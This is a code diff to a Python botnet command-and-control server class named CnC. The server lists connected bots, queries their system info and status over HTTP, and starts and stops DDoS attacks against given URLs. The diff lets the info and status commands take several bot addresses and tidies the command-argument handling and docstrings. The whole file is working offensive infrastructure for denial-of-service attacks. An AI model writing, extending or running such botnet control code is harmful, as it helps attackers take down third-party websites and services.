@@ -18,13 +18,13 @@ class CnC:
         self.__address = (host, port)
         self.__bots = {}
         self.__cmds = {
-            'help': {'fun': self.__commands, 'desc': self.__commands.__doc__, 'args': 0},
-            'bots': {'fun': self.__list_clients, 'desc': self.__commands.__doc__, 'args': 0},
-            'info': {'fun': self.__get_info, 'desc': self.__get_info.__doc__, 'args': 1},
-            'status': {'fun': self.__status, 'desc': self.__status.__doc__, 'args': 1},
-            'start': {'fun': self.__start, 'desc': self.__start.__doc__, 'args': 1},
-            'stop': {'fun': self.__stop, 'desc': self.__stop.__doc__, 'args': 0},
-            'exit': {'fun': self.__exit, 'desc': self.__exit.__doc__, 'args': 0}
+            'help': {'fun': self.__commands, 'desc': self.__commands.__doc__, 'args': False},
+            'bots': {'fun': self.__list_clients, 'desc': self.__list_clients.__doc__, 'args': False},
+            'info': {'fun': self.__get_info, 'desc': self.__get_info.__doc__, 'args': True},
+            'status': {'fun': self.__status, 'desc': self.__status.__doc__, 'args': True},
+            'start': {'fun': self.__start, 'desc': self.__start.__doc__, 'args': True},
+            'stop': {'fun': self.__stop, 'desc': self.__stop.__doc__, 'args': False},
+            'exit': {'fun': self.__exit, 'desc': self.__exit.__doc__, 'args': False}
         }
         self.__lock = threading.Lock()  # lock for thread-safe access to attributes
 
@@ -60,7 +60,7 @@ class CnC:
         Lists all the commands.
         """
         return "\n\t- " + "\n\t- ".join(
-            f"{cmd}: {self.__cmds[cmd]['desc']}" for cmd in self.__cmds.keys())
+            f"{cmd}: {self.__cmds[cmd]['desc'].strip()}" for cmd in self.__cmds.keys())
 
     def __list_clients(self) -> str:
         """
@@ -82,53 +82,66 @@ class CnC:
 
     def __get_info(self, addresses) -> str:
         """
-        Get information about the software and hardware configuration of a specific bot given his IP address.
+        Get information about the software and hardware configurations of specific bots given their IP addresses.
         """
         with self.__lock:
             if not self.__bots:
                 return colored("No bots connected.", 'red')
 
-            address = addresses[0]
+            res = ""
 
-            if address not in self.__bots.keys():
-                return colored("This address does not belong to any connected bot.", 'red')
+            for address in addresses:
 
-            try:
-                response = requests.get(f"http://{address}:{self.__bots[address]}/info")
-            except (http.client.RemoteDisconnected, requests.exceptions.ConnectionError) as e:
-                return colored(e, 'red')
+                res += f"System info of bot {address}:\n"
 
-            res = f"System info of bot {address}:\n"
-            for k, v in json.loads(response.text).items():
-                res += f"\t- {k}: {v}\n"
+                if address not in self.__bots.keys():
+                    res += colored("This address does not belong to any connected bot.\n", 'red')
+                    continue
+
+                try:
+                    response = requests.get(f"http://{address}:{self.__bots[address]}/info")
+                except (http.client.RemoteDisconnected, requests.exceptions.ConnectionError):
+                    res += colored("Bot disconnected.\n", 'red')
+                    continue
+
+                for k, v in json.loads(response.text).items():
+                    res += f"\t- {k}: {v}\n"
+                res += "\n"
             return res
 
     def __status(self, addresses):
         """
-        Check the status of a specific bot given his IP address.
+        Check the status of a specific bot given his IP addresses.
         """
         with self.__lock:
             if not self.__bots:
                 return colored("No bots connected.", 'red')
 
-            address = addresses[0]
+            res = ""
 
-            if address not in self.__bots.keys():
-                return colored("This address does not belong to any connected bot.", 'red')
+            for address in addresses:
 
-            try:
-                response = requests.get(f"http://{address}:{self.__bots[address]}/status")
-            except (http.client.RemoteDisconnected, requests.exceptions.ConnectionError) as e:
-                return colored(e, 'red')
+                res += f"Status of bot {address}:\n"
 
-            res = f"Status of bot {address}:\n"
-            for k, v in json.loads(response.text).items():
-                res += f"\t- {k}: {v}\n"
+                if address not in self.__bots.keys():
+                    res += colored("This address does not belong to any connected bot.\n", 'red')
+                    continue
+
+                try:
+                    response = requests.get(f"http://{address}:{self.__bots[address]}/status")
+                except (http.client.RemoteDisconnected, requests.exceptions.ConnectionError):
+                    res += colored("Bot disconnected.\n", 'red')
+                    continue
+
+                for k, v in json.loads(response.text).items():
+                    res += f"\t- {k}: {v}\n"
+                res += "\n"
             return res
 
-    def __start(self, urls):
+    def __start(self, urls):  # TODO get url from file
+        # TODO implement more than one argument
         """
-        Start a DDoS attack to the specified url.
+        Start a DDoS attack to the given  urls.
         """
         url = urls[0]
         with self.__lock:
@@ -144,7 +157,7 @@ class CnC:
 
     def __stop(self):
         """
-        Stop the running DDoS attack.
+        Stop the running DDoS attacks.
         """
         with self.__lock:
             if len(self.__bots) == 0:
@@ -180,20 +193,18 @@ class CnC:
 
         stop.set()  # stop the socket thread
 
-    def __run_cmd(self, line):  # TODO implement more than one argument
+    def __run_cmd(self, line):
         try:
             if ' ' in line:
                 cmd, args = line.split(' ', 1)
                 args = args.split(' ')
-                if self.__cmds[cmd]['args'] > len(args):
-                    return colored("Too few arguments.", 'red')
-                elif self.__cmds[cmd]['args'] < len(args):
-                    return colored("Too many arguments.", 'red')
-                else:
+                if self.__cmds[cmd]['args']:
                     return self.__cmds[cmd]['fun'](args)
+                else:
+                    return colored("Too many arguments.", 'red')
             else:
                 cmd = line
-                if self.__cmds[cmd]['args'] > 0:
+                if self.__cmds[cmd]['args']:
                     return colored("Too few arguments.", 'red')
                 else:
                     return self.__cmds[cmd]['fun']()
